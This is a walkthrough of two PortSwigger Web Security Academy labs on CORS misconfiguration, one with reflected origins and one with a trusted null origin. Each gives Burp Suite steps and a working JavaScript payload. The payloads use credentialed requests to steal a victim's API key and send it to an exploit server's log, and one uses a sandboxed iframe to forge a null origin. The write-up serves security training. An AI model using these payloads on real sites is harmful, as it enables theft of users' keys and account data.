**Lab #1: CORS vulnerability with basic origin reflection**

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Check intercept is off, then use the browser to log in and access your account page.
Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
Send the request to Burp Repeater, and resubmit it with the added header:

Origin: https://example.com
Observe that the origin is reflected in the Access-Control-Allow-Origin header.
In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL:

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
Go back to the exploit server and click Deliver exploit to victim.
Click Access log, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1b3764fa-a537-41dd-80c2-834650d431da)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/43df1957-304e-486b-bba7-ef4516270ccc)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/e496e357-52f7-4fc0-ad74-f97c4afb5bd9)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/5e25eaca-f1d8-4213-9d57-6e145bc808e6)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/210dff91-13cc-4514-829b-485f4881d65a)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/4e8df9e4-31ef-45a1-979b-d51813dc7b67)

**Lab #2: CORS vulnerability with trusted null origin** 

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
Notice the use of an iframe sandbox as this generates a null origin request.

Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
Go back to the exploit server and click "Deliver exploit to victim".
Click "Access log", retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d6241fd9-c4e8-4d1b-b8a5-28b73702a7a2)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/95d2de0f-a086-4595-8f08-8ead4842c883)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/096c7bf9-07b0-4e3e-95e9-05a2799b7f9d)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b691fbde-0899-4b0d-b176-a4f5cd1acab3)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/f4e50ab0-ba78-4a9a-b8df-30a4de4001f1)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d89a3c07-d749-4392-a8d7-55695b3e5096)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8ca02f8e-4903-45ee-81ec-da7c9e422018)
